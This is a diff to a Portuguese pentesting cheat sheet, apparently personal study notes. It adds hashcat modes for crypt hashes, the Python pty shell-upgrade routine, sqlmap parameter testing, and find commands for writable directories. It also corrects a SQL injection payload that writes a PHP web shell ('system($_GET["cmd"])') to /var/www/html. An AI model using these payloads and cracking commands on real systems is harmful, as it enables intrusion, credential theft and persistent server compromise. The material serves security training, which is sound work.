@@ -1120,9 +1120,13 @@ cewl URL -m LENGTH
                      Minimum word length, default 3.
 
 # hashcat
+- hash examples https://hashcat.net/wiki/doku.php?id=example_hashes
 
 ```
 hashcat -m <hash_type> <hash_file> <wordlist>
+
+# md5
+hashcat -m 0 <hash_file> <wordlist>
 ```
 
 listar exemplos de hashes:
@@ -1159,6 +1163,16 @@ unshadow passwd shadow >  hashes_formatadas
 john hashes_formatadas
 ```
 
+# crypt
+
+| `$1$`     | **MD5**      | `-m 500`  | Antigo e inseguro (evitar).               |
+| --------- | ------------ | --------- | ----------------------------------------- |
+| `$2a$`    | **Blowfish** | `-m 3200` | Usado no bcrypt (com custo de CPU).       |
+| `$5$`     | **SHA-256**  | `-m 7400` | Mais seguro que MD5.                      |
+| `$6$`     | **SHA-512**  | `-m 1800` | Padrão em sistemas Linux modernos.        |
+| `$y$`     | **yescrypt** | `-m 2900` | Novo (usado em algumas distros recentes). |
+| `$argon2` | **Argon2**   | `-m 7200` | Resistente a GPUs/ASICs (mais raro).      |
+
 ## bruteforce
 
 ```
@@ -1192,11 +1206,21 @@ buscar uma string em todo o sistema
 grep -ri "desec" /caminho/do/diretorio 2>/dev/null
 ```
 # ritual
+**versão python3:**
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 CTRL+Z
-stty raw -echo
-fg
+stty raw -echo; fg
+ls
+export TERM=xterm
+```
+
+versão python2:
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo; fg
+ls
 export TERM=xterm
 ```
 
@@ -1670,7 +1694,7 @@ Escrita de arquivo no servidor:
 ```
 select * from usuarios where login='' union select 1,2,'PAYLOAD' INTO OUTFILE '/var/www/html/payload.php';
 
-select * from usuarios where login='' union select 1,2,"<?php SYSTEM($_GET['param'])>" INTO OUTFILE '/var/www/html/payload.php';
+select * from usuarios where login='' union select 1,2,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/payload.php';
 
 
 ```
@@ -1730,6 +1754,9 @@ sqlmap -u "[URL]"
 
 # exemplo
 sqlmap -u "http://172.16.1.245/produtos.php?mprod=0&cat=26&subcat=161&pag=3" 
+
+# testando sql injection num parametro específico -p <param>
+sqlmap -u "http://172.16.1.116/acs/admin.php?pw=admin&page=/acs/index.php&del=3" -p del
 ```
 
 **Retrieve de informações**
@@ -2566,6 +2593,7 @@ cat /etc/crontab
 buscar por diretórios que tenho permissão de escrita
 ```
 find / -writable -type d 2>/dev/null
+find / -type d \( -perm -u=w -o -perm -g=w \) -user $(whoami) 2>/dev/null
 ```
 procura por arquivos que possuem o bit SUID ativado
 ```
